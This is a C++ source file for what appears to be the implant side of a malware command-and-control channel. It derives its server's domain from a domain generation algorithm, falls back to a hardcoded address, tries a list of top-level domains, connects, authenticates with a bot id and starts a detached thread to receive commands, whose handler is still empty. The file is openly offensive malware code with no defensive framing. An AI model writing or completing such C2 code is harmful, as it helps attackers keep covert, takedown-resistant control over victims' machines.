#include "c2.h"

std::string C2::get_basedomain()
{
    return dga(dgaseed);
}

bool C2::authenticate()
{
    //assumes connected socket
    try {
        netpack::Packet p(2);
        p << id;
        send_packet(p);
        /* TODO: auth without packets. recv size from unknown host could lead to
        * huge memory allocations. Use mysocket.read_some(asio::buffer(buf, n));
        */
        auto resp = recv_packet();
        std::string r;
        resp >> r;
        if (r == "OKAY") {
            return true;
        }
    }
    catch (std::exception e) {
        LOG("catched an exception in auth: " << e.what());
    }
    return false;
}

void C2::receive_thread() {
    LOG("in receive thread. waiting for packets...");
    while (socket_open) {
        try {
            auto p = recv_packet();
            LOG("received a packet with id " << (int)p.id);
            switch (p.id) {
            default:
                break;
            }

        }
        catch (std::exception e) {
            LOG("exception during thread receive: " << e.what());
            return;
        }
        catch (...) {
            LOG("unknown exception in recv thread");
        }
    }
}

bool C2::is_alive()
{
    try {
        netpack::Packet p(0);
        send_packet(p);
        return true;
    }
    catch (...){
        return false;
    }
}

void C2::find_and_connect_async() {
    std::thread t(&C2::find_and_connect,this);
    t.detach();
}

bool C2::find_and_connect()
{
    mysocket = asio::ip::tcp::socket(asio_context);

    socket_open = false;
    asio::error_code ec;
    std::string full_domain;
    std::string basedomain;
    stringvec tlds = topleveldomains;
    asio::ip::tcp::resolver resolver(asio_context);

    if (fallbackaddr[0] != '\0') {
        basedomain = fallbackaddr;
        tlds.insert(tlds.begin(), ""); // to get a resolve at the first try
    }
    else {
        basedomain = get_basedomain();
    }

    LOG("generated base domain: " << basedomain);

    for (auto tld : tlds) {
        full_domain = basedomain + tld;

        asio::ip::tcp::resolver::query query(full_domain, port);
        auto results = resolver.resolve(query, ec);

        asio::ip::tcp::endpoint endpoint;

        if (!ec) {
            for (auto res : results) {
                endpoint = res.endpoint();

                LOG("resolved " << full_domain << " to " << endpoint.address().to_string());

                mysocket.connect(endpoint,ec); //TODO: handle error
                if (authenticate()) {
                    socket_open = true;
                    LOG("authenticated. Connection open. Starting recv thread");

                    std::thread t(&C2::receive_thread, this);
                    t.detach();

                }

                if (!ec) {
                    LOG("sucessfuly connected to c2 at " << endpoint.address().to_string() << ":" << port);
                    goto valid_found;
                }
            }
        }
    }
    return false;

valid_found:
    return true;

}

void C2::send_packet(netpack::Packet& p)
{
    mysocket.send(asio::buffer(p.full()));
}

netpack::Packet C2::recv_packet()
{
    netpack::Packet p(0);
    netpack::bytevec sbuf{ 0,0,0,0 };
    asio::error_code ec;

    mysocket.read_some(asio::buffer(sbuf, 4), ec);
    uint32_t sz = netpack::unpack_size(sbuf.data());

    if (!ec){
        netpack::bytevec pbuf(sz);

        mysocket.read_some(asio::buffer(pbuf, sz), ec);

        p.from_net(pbuf.data(), sz);
    }
    else {
        socket_open = false;
        throw std::exception((std::string("error while receiving a packet: ") + ec.message()).c_str());

    }

    return p;
}
